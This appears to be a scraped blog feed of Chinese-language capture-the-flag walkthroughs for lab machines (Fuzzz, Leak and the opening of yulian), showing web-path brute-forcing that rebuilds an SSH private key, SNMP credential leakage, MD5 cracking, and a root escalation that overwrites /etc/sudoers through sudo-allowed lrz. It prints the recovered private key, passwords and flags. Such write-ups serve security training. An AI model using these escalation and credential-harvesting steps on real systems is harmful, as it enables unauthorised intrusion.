┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line2
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line2 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line1/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line1/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 23647 / 1102800 (2.14%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24595 / 1102800 (2.23%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line2/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,zip,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Q                    (Status: 200) [Size: 0]
Progress: 51864 / 1102800 (4.70%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53006 / 1102800 (4.81%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line3                                                                                                                         
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line3 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line4
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line4 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line5
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line5 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line6
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line6 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 404 NOT FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 207
&lt; 
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line3/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line3/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/X                    (Status: 200) [Size: 0]
Progress: 39151 / 1102800 (3.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 39753 / 1102800 (3.60%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line4/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/A                    (Status: 200) [Size: 0]
Progress: 28543 / 1102800 (2.59%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 28874 / 1102800 (2.62%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line5/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line5/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/5                    (Status: 200) [Size: 0]
Progress: 23689 / 1102800 (2.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24483 / 1102800 (2.22%)
===============================================================
Finished
===============================================================
```

看起来像爆破字符，先爆破一行看看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chars=({a..z} {A..Z} {0..9}); dir=''; while true; do found=false; for c in '${chars[@]}'; do testdir='$dir$c'; res=$(curl -s -o /dev/null -w '%{http_code}' 'http://192.168.205.163:8000/line1/$testdir'); [[ '$res' == '200' ]] &amp;&amp; { echo 'Found: $testdir'; dir='$testdir'; found=true; break; }; done; $found || break; done
Found: b
Found: b3
Found: b3B
Found: b3Bl
Found: b3Blb
Found: b3Blbn
Found: b3BlbnN
Found: b3BlbnNz
Found: b3BlbnNza
Found: b3BlbnNzaC
Found: b3BlbnNzaC1
Found: b3BlbnNzaC1r
Found: b3BlbnNzaC1rZ
Found: b3BlbnNzaC1rZX
Found: b3BlbnNzaC1rZXk
Found: b3BlbnNzaC1rZXkt
Found: b3BlbnNzaC1rZXktd
Found: b3BlbnNzaC1rZXktdj
Found: b3BlbnNzaC1rZXktdjE
Found: b3BlbnNzaC1rZXktdjEA
Found: b3BlbnNzaC1rZXktdjEAA
Found: b3BlbnNzaC1rZXktdjEAAA
Found: b3BlbnNzaC1rZXktdjEAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG
Found: b3BlbnNzaC1rZXktdjEAAAAABG5
Found: b3BlbnNzaC1rZXktdjEAAAAABG5v
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmU
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9u
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAM
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2g
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'b3BlbnNzaC1rZXktdjE' | base64 -d 
openssh-key-v1                                                                  
```

是OpenSSH私钥
重新写一个脚本

```
#!/bin/bash

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+='
dir=''

for line in {1..5}; do
  url='http://192.168.205.163:8000/line$line/'
  dir=''
  while true; do
    found=0
    for ((i=0; i&lt;${#chars}; i++)); do
      c='${chars:$i:1}'
      testdir='$dir$c'
      code=$(curl -s -o /dev/null -w '%{http_code}' '$url$testdir')
      if [ '$code' = '200' ]; then
        dir='$testdir'
        echo -n '$c'
        found=1
        break
      fi
    done
    [ $found -eq 0 ] &amp;&amp; break
  done
  echo
done
```

运行

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash bp.sh
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
```

拼接一下

```
┌──(kali㉿kali)-[~]
└─$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgwAAAJDS3+5f0t/u
XwAAAAtzc2gtZWQyNTUxOQAAACArnEFFrjDI6rYt5GmUDxMvSeX3pcn0GGBfgo1EQtXpgw
AAAEBCjeRitoZJIm1c4i0VD2Muw5nqgb7zC13vMaxS/la+vSucQUWuMMjqti3kaZQPEy9J
5felyfQYYF+CjURC1emDAAAACWFzYWhpQHBoaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

改权限

```
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ ssh asahi@192.168.205.163 -i id_rsa
The authenticity of host '192.168.205.163 (192.168.205.163)' can't be established.
ED25519 key fingerprint is SHA256:y+2KKHDaMy8FmNZpu0PMG4PJ+b1w5rQQScGZYvJj4L8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.163' (ED25519) to the list of known hosts.

fuzzz:~$ id
uid=1001(asahi) gid=1001(asahi) groups=1001(asahi)
fuzzz:~$ sudo -l
Matching Defaults entries for asahi on fuzzz:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asahi:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User asahi may run the following commands on fuzzz:
    (ALL) NOPASSWD: /usr/local/bin/lrz
```

lrz用于通过 ZMODEM/YMODEM/XMODEM 协议接收文件

然后看帮助文档

```
-C, --allow-remote-commands allow execution of remote commands (Z)
```

这个选项的字面意思就是“**允许执行远程命令**”。

然后扒拉了很久，都没行

我也尝试了上传文件覆盖，但是应该是我Tabby有问题，覆盖不了

后面看到

```
--tcp-server            open socket, wait for connection (Z)
```

so

```
fuzzz:/etc$ sudo /usr/local/bin/lrz --tcp-server
connect with lrz --tcp-client 'fuzzz.hmv:46143'
```

kali

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat sudoers
asahi ALL=(ALL:ALL) NOPASSWD: ALL
                                         
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sz --tcp-client 192.168.205.163:46143 -y sudoers
connecting to [192.168.205.163] &lt;46143&gt;
```

靶机弹出了

```
lrz waiting to receive.fuzzz:/etc$ sudo -l
User asahi may run the following commands on fuzzz:
    (ALL : ALL) NOPASSWD: ALL
fuzzz:/etc$ sudo su
/etc # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/etc # cat /root/root.flag 
flag{46a0e055d5db8d82eee6e7eb3ee3ccf64be3fca2}
/etc # cat /home/asahi/user.flag 
flag{da39a3ee5e6b4b0d3255bfef95601890afd80709}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Fuzzz.html</guid><pubDate>Wed, 02 Jul 2025 01:34:51 +0000</pubDate></item><item><title>内部_Leak</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Leak.html</link><description>## 靶机信息

- **IP 地址:** `192.168.205.161`
- **攻击机:** `192.168.205.128`

---

## 一、信息收集与服务枚举

首先，对目标主机进行全端口 TCP 扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.161                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 05:49 EDT
Nmap scan report for 192.168.205.161
Host is up (0.00019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:86:21:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

扫描结果显示，目标开放了 **22 (SSH)** 和 **80 (HTTP)** 两个端口。

接着，访问 80 端口的 Web 服务，发现是一个模仿 Kali Linux 终端的静态页面，未发现直接可利用的功能。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.161       
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
...
```

使用 `dirsearch` 和 `gobuster` 对网站目录进行扫描，未发现除主页外的其他有用路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://192.168.205.161               
...
Task Completed
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u 192.168.205.161 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
...
/index.html           (Status: 200) [Size: 15740]
...
```

由于 TCP 扫描未发现明显突破口，接下来对目标进行 UDP 扫描，寻找其他可能的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -sU --top-port 100 192.168.205.161
...
PORT    STATE SERVICE
161/udp open  snmp
...
```

UDP 扫描发现 **161 (SNMP)** 端口开放，这是一个关键发现。SNMP 服务常因配置不当而泄露大量敏感信息。

## 二、SNMP 信息泄露与漏洞利用

尝试使用默认的 community string `public` 来读取 SNMP 信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ snmpwalk -v2c -c public 192.168.205.161
...
```

`snmpwalk` 返回了海量信息。为了快速定位有用数据，使用 `grep` 过滤包含 `pass` 的行。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ snmpwalk -v2c -c public 192.168.205.161|grep 'pass'
iso.3.6.1.2.1.25.4.2.1.4.331 = STRING: 'leak-service --login Shinozaki --pass ShinozakiAi'
iso.3.6.1.2.1.25.6.3.1.2.13 = STRING: 'base-passwd_3.5.46_amd64'
iso.3.6.1.2.1.25.6.3.1.2.480 = STRING: 'passwd_1:4.5-1.1_amd64'
```

在系统进程信息中发现了一个惊人的信息泄露：一个名为 `leak-service` 的服务启动时，以明文形式传递了登录凭证 `Shinozaki:ShinozakiAi`。

同时，在 `snmpwalk` 的输出中还发现了域名信息 `admin@sunset.leak.dsz`。将 `leak.dsz` 和 `sunset.leak.dsz` 添加到本地 `/etc/hosts` 文件中，以便后续测试。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo vim /etc/hosts             
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 /etc/hosts                                    
192.168.205.161 leak.dsz sunset.leak.dsz
```

再次对新发现的域名进行目录扫描，`sunset.leak.dsz` 域名下发现了一个 `/manager` 路径，访问后需要认证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://sunset.leak.dsz 
...
[05:56:17] 301 -  320B  - /manager  -&gt;  http://sunset.leak.dsz/manager/
[05:56:17] 401 -   24B  - /manager/
...
```

是一个登录窗口。使用前面泄露的凭证 `Shinozaki:ShinozakiAi` 尝试登录，成功进入后台。在后台页面中，发现了ssh用户 `ai` 的密码 MD5 哈希。

![image-20250701180035946](https://7r1umphk.github.io/image/20250701180036271.webp)

- **用户:** `ai`
- **MD5 Hash:** `d21715210cb6224f9ff4c075a8906fe9`

## 三、获取初始访问权限

现在，我们需要破解这个 MD5 哈希。根据页面提示，使用 `crunch` 生成一个以 `baba` 开头的8位密码字典。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ crunch 8 8 -t baba@@@@ -o wordlist.txt
...
```

将哈希保存到文件 `hash` 中，并使用 `John the Ripper` 和刚生成的字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat hash                              
ai:d21715210cb6224f9ff4c075a8906fe9
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --format=raw-md5 --wordlist=wordlist.txt hash
...
babadawo         (ai)     
...
Session completed. 
```

成功破解密码为 `babadawo`。

使用获取到的凭证 `ai:babadawo` 尝试 SSH 登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh ai@192.168.205.161
ai@192.168.205.161's password: 
...
Last login: Tue Jul  1 05:13:09 2025 from 192.168.205.128
ai@Leak:~$
```

登录成功！现在获取 `user.txt`。

```bash
ai@Leak:~$ cat user.txt 
flag{user-13421fec-559d-11f0-a1af-5f1558743b4d}
```

成功拿到用户 flag。

## 四、权限提升

为了提升权限，首先查看当前系统上安装的软件包，特别是寻找非标准的或自定义的包。

```bash
ai@Leak:~$ dpkg -l |grep 'leak'
ii  leak-date                     1.0-1                                       amd64        Simple date and time display utility
ii  liblsan0:amd64                10.2.1-6                                    amd64        LeakSanitizer -- a memory leak detector (runtime)
```

发现一个名为 `leak-date` 的可疑软件包。查看其详细信息。

```bash
ai@Leak:~$ dpkg -s leak-date
Package: leak-date
Status: install ok installed
Priority: optional
Section: utils
Installed-Size: 500
Maintainer: Security Admin &lt;admin@leak.dsz&gt;
Architecture: amd64
Version: 1.0-1
Description: Simple date and time display utility
 This package provides a minimal CLI utility to display
 the current system date and time. Ideal for scripts and
 system monitoring. SECURITY NOTICE: System debug token
 IMKCFRunLoopWakeUpReliable for root access.
```

在软件包的描述信息中，发现了一条至关重要的安全提示：`SECURITY NOTICE: System debug token IMKCFRunLoopWakeUpReliable for root access.`。这串字符 `IMKCFRunLoopWakeUpReliable` 极有可能就是 root 用户的密码。

使用 `su -` 切换到 root 用户，并输入这串字符作为密码。

```bash
ai@Leak:~$ su - 
Password: 
root@Leak:~#
```

成功切换到 root 用户！现在读取最终的 root flag。

```bash
root@Leak:~# cat /root/root.txt 
flag{root-357d3d08-5598-11f0-a27e-639fd7e7110b}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Leak.html</guid><pubDate>Tue, 01 Jul 2025 11:09:43 +0000</pubDate></item><item><title>内部_yulian</title><link>https://7r1UMPHK.github.io/post/nei-bu-_yulian.html</link><description>![image-20250627200158237](https://7r1umphk.github.io/image/image20250627200158372.webp)

群内靶机

开搞

## 一、信息收集与发现

渗透测试的第一步永远是信息收集。我们首先需要确定目标在网络中的位置。

### 1.1 主机发现

我们处于 `192.168.205.0/24` 网段，使用 `arp-scan` 对整个C段进行扫描，以发现存活的主机。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                      
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:0f:fa:c2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f3:f6:bb       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.038 seconds (125.61 hosts/sec). 4 responded
                 
```

成功发现目标主机IP为 `192.168.205.131`。

### 1.2 端口扫描

确定IP后，使用 `nmap` 对其进行全端口扫描，探测开放的服务。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 08:02 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8080/tcp filtered http-proxy
MAC Address: 08:00:27:0F:FA:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds
                                                    
```

扫描结果显示，SSH（22端口）和HTTP（80端口）服务是开放的，而8080关闭（我本身说来试一下LingMj的压测大法，结果不行），那看80

## 二、端口敲门与服务暴露

访问80端口的Web服务，我们发现一个模拟的Linux终端界面。

![image-20250627200436415](https://7r1umphk.github.io/image/image20250627200436564.webp)

看到这就有点假了，所以直接看源码吧

```
&lt;!DOCTYPE html&gt;
&lt;html lang='en'&gt;
&lt;head&gt;
  &lt;meta charset='UTF-8'&gt;
  &lt;title&gt;Linux Terminal Simulator&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #000;
      color: #00ff00;
      font-family: monospace;
      margin: 0;
      padding: 10px;
    }
    #terminal {
      white-space: pre-wrap;
      min-height: 90vh;
      overflow-y: auto;
    }
    .line {
      display: flex;
      flex-wrap: wrap;
    }
    input {
      background: none;
      border: none;
      color: #00ff00;
      font-family: monospace;
      font-size: 1em;
      outline: none;
      flex: 1;
    }
    ::selection {
      background: #008000;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div id='terminal'&gt;&lt;/div&gt;

  &lt;script&gt;
    const terminal = document.getElementById('terminal');

    const fileSystem = {
      'home': {
        'user': {
          'file1.txt': 'Hello, this is file1.',
          'notes.md': '# Notes\nThis is a markdown file.'
        }
      },
      'var': {
        'log.txt': 'System log content here.'
      },
      'opt':{
        'code':{
            'test.c':`#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
        srand(114514);
        for(int i = 0; i &lt; 114514; i++)
        {
                rand();
        }
        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);

        printf('%d\\n',rand()%65535);


        return 0;
}`
        }
      }

    };

    let currentPath = ['home', 'user'];
    let history = [];
    let historyIndex = -1;

    function getDir(pathArr, fs) {
      let node = fs;
      for (let part of pathArr) {
        if (node[part] &amp;&amp; typeof node[part] === 'object') {
          node = node[part];
        } else {
          return null;
        }
      }
      return node;
    }

    function getPathString() {
      return '/' + currentPath.join('/');
    }

    function renderPrompt() {
      return `user@linux:${getPathString()}$ `;
    }

    function printOutput(prompt, input, output) {
      const block = document.createElement('div');
      block.innerHTML = `
        &lt;div&gt;${prompt}${input}&lt;/div&gt;
        &lt;div&gt;${output}&lt;/div&gt;
      `;
      terminal.appendChild(block);
    }

    function createInputLine() {
      const line = document.createElement('div');
      line.className = 'line';

      const promptSpan = document.createElement('span');
      promptSpan.textContent = renderPrompt();

